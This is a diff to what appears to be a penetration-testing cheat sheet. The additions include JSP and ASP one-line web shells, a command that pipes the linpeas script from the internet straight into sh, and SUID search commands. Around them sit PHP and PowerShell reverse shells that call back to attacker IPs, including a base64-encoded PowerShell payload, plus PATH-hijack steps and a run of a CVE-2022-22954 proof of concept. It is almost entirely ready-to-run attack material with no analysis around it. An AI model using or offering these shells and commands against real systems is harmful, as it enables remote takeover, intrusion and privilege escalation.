@@ -47,6 +47,12 @@ python3 -m http.server 8080
 
 zip -r all.zip *
 
+# Web Root (web root, default):
+Apache 	/var/www/html/
+Nginx 	/usr/local/nginx/html/
+IIS 	c:\inetpub\wwwroot\
+XAMPP 	C:\xampp\htdocs\
+
 # WinPeas in memory (windows, security tool)
 Download:
 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
@@ -103,8 +109,9 @@ wget https://raw.githubusercontent.com/DrorDvash/CVE-2022-22954_VMware_PoC/main/
 python3 CVE-2022-22954.py example.com "cat /etc/passwd"
 
 wget https://raw.githubusercontent.com/DrorDvash/CVE-2022-22954_VMware_PoC/main/CVE-2022-22954.py
-From user to root (Privilege Escalation)
-find / -perm +6000 2> /dev/null
+
+# Priv Escalation (priv esc):
+linpeas: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 Check sudo apps you can run:
 sudo -l
@@ -114,6 +121,11 @@ which tar
 echo "/bin/bash" > tar
 echo $PATH
 export PATH=/tmp:$PATH
+
+find / -perm -4000 2>/dev/null
+
+From user to root (Privilege Escalation)
+find / -perm +6000 2> /dev/null
 
 Read root files with error messages (unstable):
 command_you_can_run --var-in-there="/root/flag.txt"
@@ -191,6 +203,9 @@ wpscan --url http://domain -e vp,dbe,cb
 # SSH (port forwarding)
 ssh -L 3389:10.200.115.35:3389 -i id.key root@holo.live
 
+# SCP (scp, ssh, copy, file):
+scp /path/of/your/local/filename username@hostname:/path/to/remote/server/folder
+
 # REVERSE SHELLS
 Upgrade shell:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -215,7 +230,13 @@ PHP
 php -r '$sock=fsockopen("10.10.10.10",9001);exec("bash <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 
-Powershell:
+JSP (jsp):
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+ASP (asp):
+<% eval request("cmd") %>
+
+Powershell (powershell, ps):
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
